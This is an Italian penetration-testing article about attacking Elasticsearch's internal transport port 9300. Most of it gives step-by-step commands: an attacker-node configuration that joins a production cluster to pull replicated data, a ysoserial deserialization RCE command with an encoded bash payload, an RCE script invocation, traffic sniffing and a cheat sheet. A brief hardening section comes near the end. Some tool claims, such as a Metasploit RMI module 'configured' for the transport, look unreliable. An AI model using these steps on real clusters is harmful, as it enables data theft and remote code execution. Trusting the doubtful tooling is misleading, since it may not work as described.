---
title: 'Porta 9300 Elasticsearch Transport: Cluster Join e Java RCE'
slug: porta-9300-elasticsearch-cluster
description: >-
  Porta 9300 Elasticsearch transport: cluster join non autorizzato, replica dati
  su nodo malevolo, Java deserialization RCE CVE-2015-5377 e differenze
  operative dalla porta 9200.
image: /porta-9300-elasticsearch-cluster.webp
draft: false
date: 2026-04-18T00:00:00.000Z
categories:
  - networking
subcategories:
  - porte
tags:
  - porta-9300
  - elasticsearch-transport
  - cluster-join-attack
  - java-deserialization-rce
---

Se la [porta 9200](https://hackita.it/articoli/porta-9200-elasticsearch) è la porta pubblica di Elasticsearch — quella che risponde alle query REST e che tutti i pentester conoscono — la porta 9300 TCP è il suo lato privato. È il **protocollo di trasporto binario** che i nodi Elasticsearch usano per comunicare tra loro: sincronizzazione degli shard, replicazione dei dati, elezione del master, distribuzione delle query. Non è pensata per essere usata dagli utenti finali, e proprio per questo è spesso più trascurata e meno protetta della 9200.

Per capire il contesto: Elasticsearch è quasi sempre deployato come cluster di più nodi. I tuoi dati — log, documenti, metriche — non stanno su un singolo server ma sono distribuiti su 3, 5, 10 o più nodi che si scambiano continuamente informazioni attraverso la porta 9300. Questo protocollo binario gestisce operazioni critiche: quando un nodo va offline, gli altri ridistribuiscono i suoi dati; quando fai una query su un nodo, questo contatta gli altri per raccogliere i risultati. La 9300 è il sistema nervoso del cluster.

Nel penetration testing, la 9300 esposta apre vettori di attacco diversi dalla 9200: **cluster join** (un attaccante può aggiungere un nodo malevolo al cluster e ricevere copie di tutti i dati), **deserializzazione Java** (il protocollo trasporta oggetti Java serializzati — terreno fertile per RCE), e **man-in-the-middle** tra nodi (intercettazione dei dati replicati).

## Come Funziona il Transport Protocol

```
                    Transport Protocol (:9300)
                    ┌─────────────────────┐
Node 1 ◄──────────►│  Cluster gossip     │◄──────────► Node 3
(:9200/:9300)       │  Shard replication  │            (:9200/:9300)
                    │  Query distribution │
Node 2 ◄──────────►│  Master election    │
(:9200/:9300)       └─────────────────────┘

Client (REST API :9200)     ← L'utente normale usa questa
Attacker (Transport :9300)  ← Noi entriamo da qui
```

La 9300 usa un protocollo binario proprietario di Elasticsearch basato su serializzazione Java. Non è HTTP — non puoi interrogarla con `curl`. Servono tool specifici o librerie Java.

## 1. Enumerazione

### Nmap

```bash
nmap -sV -p 9200,9300 10.10.10.40
```

```
PORT     STATE SERVICE            VERSION
9200/tcp open  http               Elasticsearch REST API 8.11.3
9300/tcp open  elasticsearch-tcp  Elasticsearch Transport 8.11.3
```

Se la 9300 è aperta ma la 9200 no → il nodo è configurato come "data only" o "transport only", nascosto dal REST API ma raggiungibile via transport.

### Banner grab

```bash
# Il protocollo non è HTTP, ma possiamo catturare il banner iniziale
echo -e '\x45\x53' | nc -w 3 10.10.10.40 9300 | xxd | head -10
```

Se ricevi dati binari con `ES` nell'header → Elasticsearch Transport confermato.

### Nmap script

```bash
nmap -p 9300 --script=elasticsearch-info 10.10.10.40
```

### Scoprire tutti i nodi del cluster

Se hai accesso alla [porta 9200](https://hackita.it/articoli/porta-9200-elasticsearch) su qualsiasi nodo:

```bash
curl -s http://10.10.10.40:9200/_cat/nodes?v&h=ip,name,node.role,version
```

```
ip           name        node.role version
10.10.10.40  es-prod-01  cdfhilmr  8.11.3
10.10.10.41  es-prod-02  cdfhilmr  8.11.3
10.10.10.42  es-prod-03  cdfhilmr  8.11.3
```

Tre nodi → tre porte 9300 da testare. Spesso uno è meno protetto degli altri.

```bash
# Dettagli completi dei nodi (include transport address)
curl -s http://10.10.10.40:9200/_nodes?pretty | grep -A3 "transport_address"
```

```json
"transport_address": "10.10.10.40:9300",
"transport_address": "10.10.10.41:9300",
"transport_address": "10.10.10.42:9300"
```

## 2. Cluster Join — Aggiungere un Nodo Malevolo

Nelle versioni di Elasticsearch senza TLS sul transport layer (default fino alla 7.x, e qualsiasi versione senza X-Pack Security), qualsiasi macchina che conosce il nome del cluster può **unirsi come nodo**. Una volta dentro il cluster, il nodo riceve automaticamente copie dei dati (shard replication).

### Prerequisiti

Devi conoscere il `cluster.name` — lo ottieni dalla [porta 9200](https://hackita.it/articoli/porta-9200-elasticsearch):

```bash
curl -s http://10.10.10.40:9200/ | python3 -c "import json,sys;print(json.load(sys.stdin)['cluster_name'])"
```

```
production
```

### Join con Elasticsearch locale

```bash
# Installa Elasticsearch sulla tua macchina attacker
# Configura elasticsearch.yml:
cat > /tmp/es-attacker.yml << 'EOF'
cluster.name: production
node.name: attacker-node
network.host: 10.10.10.200
discovery.seed_hosts: ["10.10.10.40:9300"]
node.roles: [data]
EOF

# Avvia con la config custom
ES_PATH_CONF=/tmp elasticsearch
```

Se il cluster accetta il tuo nodo → Elasticsearch inizia a replicare shard sulla tua macchina. Stai ricevendo una copia dei dati del cluster.

```bash
# Verifica che il join sia riuscito
curl -s http://10.10.10.200:9200/_cat/nodes?v
```

Se vedi il tuo `attacker-node` nella lista → sei dentro il cluster.

### Cosa succede dopo il join

Il cluster ridistribuisce automaticamente gli shard. Il tuo nodo riceve copie dei dati — puoi query-arli localmente:

```bash
curl -s http://10.10.10.200:9200/_cat/shards?v | grep "attacker-node"
```

```
users              0 r STARTED 150000 890mb 10.10.10.200 attacker-node
logs-auth-2026.02  2 r STARTED 1200000 800mb 10.10.10.200 attacker-node
```

Hai una replica dell'indice `users` (150K documenti) e dei log di autenticazione.

## 3. Deserializzazione Java — RCE via Transport

Il protocollo di transport usa serializzazione Java per lo scambio di messaggi tra nodi. Le versioni vecchie di Elasticsearch (1.x-5.x) sono vulnerabili a **Java deserialization RCE** sulla porta 9300.

### CVE-2015-5377 — Transport RCE

```bash
# ysoserial payload via transport protocol
# Richiede un client Java custom che si connette alla 9300
java -cp ysoserial.jar:es-transport-client.jar \
  ExploitTransport 10.10.10.40 9300 CommonsCollections5 "bash -c {echo,YmFzaA==}|{base64,-d}|bash"
```

### Metasploit

```bash
use exploit/multi/elasticsearch/search_groovy_script
# Questo modulo usa la REST API, ma per la 9300:
use exploit/multi/misc/java_rmi_server
# Configurato per Elasticsearch transport
```

### Tool specifici

```bash
# elasticsearch-rce — exploit per transport protocol
python3 es_transport_rce.py -t 10.10.10.40 -p 9300 -c "id"
```

## 4. Sniffing del Traffico Transport

Se sei in posizione di MITM nella rete (ARP spoofing, posizione privilegiata):

```bash
# Cattura traffico tra nodi Elasticsearch
tcpdump -i eth0 -w es_transport.pcap port 9300

# Analizza con Wireshark
wireshark es_transport.pcap
```

Il traffico sulla 9300 non è cifrato di default — contiene i dati replicati tra nodi in formato serializzato Java. Con strumenti di parsing è possibile estrarre i documenti in transito.

## 5. Differenze Operative: 9300 vs 9200

| Aspetto       | Porta 9200 (REST)      | Porta 9300 (Transport)               |
| ------------- | ---------------------- | ------------------------------------ |
| Protocollo    | HTTP/JSON              | Binario Java                         |
| Uso primario  | Client queries         | Comunicazione inter-nodo             |
| Tool standard | curl, browser          | Client Java, tool custom             |
| Auth default  | Nessuna (pre-8.x)      | Nessuna (pre-8.x)                    |
| RCE vector    | Script fields (Groovy) | Deserializzazione Java               |
| Data access   | Query → risultati      | Cluster join → replicazione completa |
| TLS           | Configurabile          | Configurabile (spesso ignorato)      |

**Strategia pratica:** se la 9200 è protetta (auth, firewall) ma la 9300 no, attacca la 9300. Se entrambe sono aperte, la 9200 è più semplice da usare. La 9300 è il piano B — e un piano B potente.

## 6. Detection & Hardening

* **TLS sul transport** — `xpack.security.transport.ssl.enabled: true` con certificati per ogni nodo
* **Cluster join protetto** — `discovery.seed_hosts` esplicito, non `0.0.0.0`
* **Firewall** — porta 9300 aperta solo tra i nodi del cluster, bloccata per tutti gli altri
* **Non esporre la 9300 su Internet** — mai
* **X-Pack Security** — autenticazione anche sul transport layer
* **Monitora** nuovi nodi nel cluster: un nodo inatteso = possibile attaccante
* **Aggiorna** — le deserializzazioni Java sono fixate nelle versioni recenti

## 7. Cheat Sheet Finale

| Azione          | Comando                                                           |
| --------------- | ----------------------------------------------------------------- |
| Nmap            | `nmap -sV -p 9200,9300 target`                                    |
| Nodi cluster    | `curl http://target:9200/_cat/nodes?v`                            |
| Transport addr  | `curl http://target:9200/_nodes?pretty \| grep transport`         |
| Cluster name    | `curl http://target:9200/ \| grep cluster_name`                   |
| Cluster join    | Configura `cluster.name` + `discovery.seed_hosts` → avvia ES      |
| Shards locali   | `curl http://localhost:9200/_cat/shards?v`                        |
| Deserialization | `java -cp ysoserial.jar ExploitTransport target 9300 payload cmd` |
| Sniff           | `tcpdump -i eth0 -w capture.pcap port 9300`                       |
| Searchsploit    | `searchsploit elasticsearch`                                      |

***

Riferimento: Elasticsearch Transport Protocol, HackTricks Elasticsearch, Java Deserialization attacks. Uso esclusivo in ambienti autorizzati.

> L'Elasticsearch della tua azienda ha la porta 9300 aperta verso la rete? [Scoprilo con un assessment HackIta](https://hackita.it/servizi) prima che qualcuno si unisca al tuo cluster. Per imparare l'exploitation distribuita: [formazione avanzata 1:1](https://hackita.it/formazione).
